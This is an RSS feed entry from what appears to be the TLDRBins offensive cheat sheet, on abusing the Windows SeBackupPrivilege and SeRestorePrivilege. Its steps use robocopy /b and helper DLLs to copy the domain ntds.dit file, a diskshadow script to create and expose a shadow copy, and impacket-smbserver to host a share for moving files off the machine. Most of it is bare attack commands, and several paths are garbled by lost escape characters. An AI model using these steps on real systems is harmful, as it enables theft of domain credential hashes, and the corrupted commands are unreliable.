channel.title: SeRestorePrivilege on TLDRBins
channel.description: Recent content in SeRestorePrivilege on TLDRBins

item.title: SeBackupPrivilege/SeRestorePrivilege
item.description:
robocopy # For example robocopy /b <target_dir_path> C:\Windows\Tasks <target_file> Helper dlls SeBackupPrivilegeUtils.dll SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege <target_file_path> C:\Windows\Tasks\<target_file> # For example Copy-FileSeBackupPrivilege C:\Windows
tds
tds.dit C:\Windows\Tasks
tds.dit diskshadow Create a .dsh file set context persistent nowriters set metadata C:\Windows\Tasks	est.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh Run vss.dsh # Upload and run diskshadow /s C:\Windows\Tasks\vss.dsh Host a smb server (In Linux) impacket-smbserver share .
